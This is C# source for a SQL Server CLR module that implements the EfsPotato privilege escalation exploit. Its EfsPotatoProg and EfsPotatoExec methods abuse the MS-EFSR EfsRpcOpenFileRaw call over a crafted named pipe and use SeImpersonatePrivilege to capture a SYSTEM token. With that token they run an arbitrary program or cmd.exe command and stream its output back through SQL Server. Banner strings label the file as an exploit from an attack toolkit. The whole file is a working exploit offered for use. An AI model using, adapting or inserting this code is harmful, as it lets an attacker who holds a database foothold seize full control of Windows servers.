using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using Microsoft.SqlServer.Server;

namespace CLR_module;

internal class Potato
{
	public struct TOKEN_PRIVILEGES
	{
		public uint PrivilegeCount;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
		public LUID_AND_ATTRIBUTES[] Privileges;
	}

	public struct LUID_AND_ATTRIBUTES
	{
		public LUID Luid;

		public uint Attributes;
	}

	public struct LUID
	{
		public uint LowPart;

		public int HighPart;
	}

	public struct PROCESS_INFORMATION
	{
		public IntPtr hProcess;

		public IntPtr hThread;

		public int dwProcessId;

		public int dwThreadId;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct STARTUPINFO
	{
		public int cb;

		public string lpReserved;

		public string lpDesktop;

		public string lpTitle;

		public int dwX;

		public int dwY;

		public int dwXSize;

		public int dwYSize;

		public int dwXCountChars;

		public int dwYCountChars;

		public int dwFillAttribute;

		public int dwFlags;

		public short wShowWindow;

		public short cbReserved2;

		public IntPtr lpReserved2;

		public IntPtr hStdInput;

		public IntPtr hStdOutput;

		public IntPtr hStdError;
	}

	public struct SECURITY_ATTRIBUTES
	{
		public int nLength;

		public IntPtr pSecurityDescriptor;

		public int bInheritHandle;
	}

	public static void EfsPotatoProg(string program, string programArgs)
	{
		SqlContext.Pipe.Send($"Exploit for EfsPotato(MS-EFSR EfsRpcOpenFileRaw with SeImpersonatePrivilege local privalege escalation vulnerability).");
		SqlContext.Pipe.Send($"Part of GMH's fuck Tools, Code By zcgonvh.\r\n");
		LUID_AND_ATTRIBUTES[] array = new LUID_AND_ATTRIBUTES[1];
		using (WindowsIdentity windowsIdentity = WindowsIdentity.GetCurrent())
		{
			SqlContext.Pipe.Send(string.Format("[+] Current user: " + windowsIdentity.Name));
			LookupPrivilegeValue(null, "SeImpersonatePrivilege", out array[0].Luid);
			TOKEN_PRIVILEGES NewState = default(TOKEN_PRIVILEGES);
			NewState.PrivilegeCount = 1u;
			NewState.Privileges = array;
			array[0].Attributes = 2u;
			if (!AdjustTokenPrivileges(windowsIdentity.Token, DisableAllPrivileges: false, ref NewState, Marshal.SizeOf(NewState), IntPtr.Zero, IntPtr.Zero) || Marshal.GetLastWin32Error() != 0)
			{
				SqlContext.Pipe.Send($"[x] SeImpersonatePrivilege not held.");
				return;
			}
		}
		string text = Guid.NewGuid().ToString("d");
		string text2 = "\\\\.\\pipe\\" + text + "\\pipe\\srvsvc";
		IntPtr intPtr = CreateNamedPipe(text2, 3, 0, 10, 2048, 2048, 0, IntPtr.Zero);
		if (intPtr == new IntPtr(-1))
		{
			SqlContext.Pipe.Send(string.Format("[x] can not create pipe: " + new Win32Exception(Marshal.GetLastWin32Error()).Message));
			return;
		}
		ManualResetEvent manualResetEvent = new ManualResetEvent(initialState: false);
		Thread thread = new Thread(NamedPipeThread);
		thread.IsBackground = true;
		thread.Start(new object[2] { intPtr, manualResetEvent });
		Thread thread2 = new Thread(RpcThread);
		thread2.IsBackground = true;
		thread2.Start(text);
		if (manualResetEvent.WaitOne(1000))
		{
			if (ImpersonateNamedPipeClient(intPtr))
			{
				IntPtr token = WindowsIdentity.GetCurrent().Token;
				SqlContext.Pipe.Send(string.Format("[+] Get Token: " + token));
				SECURITY_ATTRIBUTES lpPipeAttributes = default(SECURITY_ATTRIBUTES);
				lpPipeAttributes.nLength = Marshal.SizeOf(lpPipeAttributes);
				lpPipeAttributes.pSecurityDescriptor = IntPtr.Zero;
				lpPipeAttributes.bInheritHandle = 1;
				CreatePipe(out var hReadPipe, out var hWritePipe, ref lpPipeAttributes, 1024);
				PROCESS_INFORMATION lpProcessInformation = default(PROCESS_INFORMATION);
				STARTUPINFO lpStartupInfo = default(STARTUPINFO);
				lpStartupInfo.cb = Marshal.SizeOf(lpStartupInfo);
				lpStartupInfo.hStdError = hWritePipe;
				lpStartupInfo.hStdOutput = hWritePipe;
				lpStartupInfo.lpDesktop = "WinSta0\\Default";
				lpStartupInfo.dwFlags = 257;
				lpStartupInfo.wShowWindow = 0;
				string text3 = null;
				text3 = $"{program} {programArgs}";
				SqlContext.Pipe.Send($"[+] Command : {text3} ");
				if (CreateProcessAsUser(token, program, programArgs, IntPtr.Zero, IntPtr.Zero, bInheritHandles: true, 134217728, IntPtr.Zero, IntPtr.Zero, ref lpStartupInfo, out lpProcessInformation))
				{
					SqlContext.Pipe.Send($"[!] process with pid: {lpProcessInformation.dwProcessId} created.\r\n==============================\r\n\r\n");
					CloseHandle(lpProcessInformation.hProcess);
					CloseHandle(hWritePipe);
					byte[] array2 = new byte[4096];
					int lpNumberOfBytesRead = 0;
					while (ReadFile(hReadPipe, array2, 4096, ref lpNumberOfBytesRead, IntPtr.Zero))
					{
						byte[] array3 = new byte[lpNumberOfBytesRead];
						Array.Copy(array2, array3, lpNumberOfBytesRead);
						SqlContext.Pipe.Send(Encoding.Default.GetString(array3));
					}
					CloseHandle(hReadPipe);
				}
			}
		}
		else
		{
			SqlContext.Pipe.Send($"[x] operation timed out.");
			CreateFile(text2, 1073741824, 0, IntPtr.Zero, 3, 128, IntPtr.Zero);
		}
		CloseHandle(intPtr);
	}

	public static void EfsPotatoExec(string cmd)
	{
		SqlContext.Pipe.Send($"Exploit for EfsPotato(MS-EFSR EfsRpcOpenFileRaw with SeImpersonatePrivilege local privalege escalation vulnerability).");
		SqlContext.Pipe.Send($"Part of GMH's fuck Tools, Code By zcgonvh.\r\n");
		string text = "c:\\Windows\\System32\\cmd.exe";
		string text2 = cmd;
		LUID_AND_ATTRIBUTES[] array = new LUID_AND_ATTRIBUTES[1];
		using (WindowsIdentity windowsIdentity = WindowsIdentity.GetCurrent())
		{
			SqlContext.Pipe.Send(string.Format("[+] Current user: " + windowsIdentity.Name));
			LookupPrivilegeValue(null, "SeImpersonatePrivilege", out array[0].Luid);
			TOKEN_PRIVILEGES NewState = default(TOKEN_PRIVILEGES);
			NewState.PrivilegeCount = 1u;
			NewState.Privileges = array;
			array[0].Attributes = 2u;
			if (!AdjustTokenPrivileges(windowsIdentity.Token, DisableAllPrivileges: false, ref NewState, Marshal.SizeOf(NewState), IntPtr.Zero, IntPtr.Zero) || Marshal.GetLastWin32Error() != 0)
			{
				SqlContext.Pipe.Send($"[x] SeImpersonatePrivilege not held.");
				return;
			}
		}
		string text3 = Guid.NewGuid().ToString("d");
		string text4 = "\\\\.\\pipe\\" + text3 + "\\pipe\\srvsvc";
		IntPtr intPtr = CreateNamedPipe(text4, 3, 0, 10, 2048, 2048, 0, IntPtr.Zero);
		if (intPtr == new IntPtr(-1))
		{
			SqlContext.Pipe.Send(string.Format("[x] can not create pipe: " + new Win32Exception(Marshal.GetLastWin32Error()).Message));
			return;
		}
		ManualResetEvent manualResetEvent = new ManualResetEvent(initialState: false);
		Thread thread = new Thread(NamedPipeThread);
		thread.IsBackground = true;
		thread.Start(new object[2] { intPtr, manualResetEvent });
		Thread thread2 = new Thread(RpcThread);
		thread2.IsBackground = true;
		thread2.Start(text3);
		if (manualResetEvent.WaitOne(1000))
		{
			if (ImpersonateNamedPipeClient(intPtr))
			{
				IntPtr token = WindowsIdentity.GetCurrent().Token;
				SqlContext.Pipe.Send(string.Format("[+] Get Token: " + token));
				SECURITY_ATTRIBUTES lpPipeAttributes = default(SECURITY_ATTRIBUTES);
				lpPipeAttributes.nLength = Marshal.SizeOf(lpPipeAttributes);
				lpPipeAttributes.pSecurityDescriptor = IntPtr.Zero;
				lpPipeAttributes.bInheritHandle = 1;
				CreatePipe(out var hReadPipe, out var hWritePipe, ref lpPipeAttributes, 1024);
				PROCESS_INFORMATION lpProcessInformation = default(PROCESS_INFORMATION);
				STARTUPINFO lpStartupInfo = default(STARTUPINFO);
				lpStartupInfo.cb = Marshal.SizeOf(lpStartupInfo);
				lpStartupInfo.hStdError = hWritePipe;
				lpStartupInfo.hStdOutput = hWritePipe;
				lpStartupInfo.lpDesktop = "WinSta0\\Default";
				lpStartupInfo.dwFlags = 257;
				lpStartupInfo.wShowWindow = 0;
				string text5 = null;
				if (text2 != null)
				{
					if (text.Equals("c:\\Windows\\System32\\cmd.exe"))
					{
						text2 = "/c " + text2;
					}
					text5 = $"{text} {text2}";
					SqlContext.Pipe.Send($"[+] Command : {text5} ");
				}
				if (CreateProcessAsUser(token, text, text5, IntPtr.Zero, IntPtr.Zero, bInheritHandles: true, 134217728, IntPtr.Zero, IntPtr.Zero, ref lpStartupInfo, out lpProcessInformation))
				{
					SqlContext.Pipe.Send($"[!] process with pid: {lpProcessInformation.dwProcessId} created.\r\n==============================\r\n\r\n");
					CloseHandle(lpProcessInformation.hProcess);
					CloseHandle(hWritePipe);
					byte[] array2 = new byte[4096];
					int lpNumberOfBytesRead = 0;
					while (ReadFile(hReadPipe, array2, 4096, ref lpNumberOfBytesRead, IntPtr.Zero))
					{
						byte[] array3 = new byte[lpNumberOfBytesRead];
						Array.Copy(array2, array3, lpNumberOfBytesRead);
						SqlContext.Pipe.Send(Encoding.Default.GetString(array3));
					}
					CloseHandle(hReadPipe);
				}
			}
		}
		else
		{
			SqlContext.Pipe.Send($"[x] operation timed out.");
			CreateFile(text4, 1073741824, 0, IntPtr.Zero, 3, 128, IntPtr.Zero);
		}
		CloseHandle(intPtr);
	}

	private static void RpcThread(object o)
	{
		string text = o as string;
		EfsrTiny efsrTiny = new EfsrTiny();
		IntPtr hContext = IntPtr.Zero;
		try
		{
			efsrTiny.EfsRpcOpenFileRaw(out hContext, "\\\\localhost/PIPE/" + text + "/\\" + text + "\\" + text, 0);
		}
		catch (Exception ex)
		{
			SqlContext.Pipe.Send(ex.ToString());
		}
	}

	private static void NamedPipeThread(object o)
	{
		object[] array = o as object[];
		IntPtr pipe = (IntPtr)array[0];
		if (array[1] is ManualResetEvent manualResetEvent)
		{
			ConnectNamedPipe(pipe, IntPtr.Zero);
			manualResetEvent.Set();
		}
	}

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToRead, ref int lpNumberOfBytesRead, IntPtr lpOverlapped);

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	private static extern IntPtr CreateFile(string lpFileName, int access, int share, IntPtr sa, int cd, int flag, IntPtr zero);

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	private static extern IntPtr CreateNamedPipe(string name, int i1, int i2, int i3, int i4, int i5, int i6, IntPtr zero);

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	private static extern IntPtr ConnectNamedPipe(IntPtr pipe, IntPtr zero);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool ImpersonateNamedPipeClient(IntPtr pipe);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, ExactSpelling = true, SetLastError = true)]
	public static extern bool CloseHandle(IntPtr handle);

	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, int Bufferlength, IntPtr PreviousState, IntPtr ReturnLength);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, int nSize);

	[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

	[DllImport("advapi32", CharSet = CharSet.Unicode, SetLastError = true)]
	public static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, IntPtr lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
}
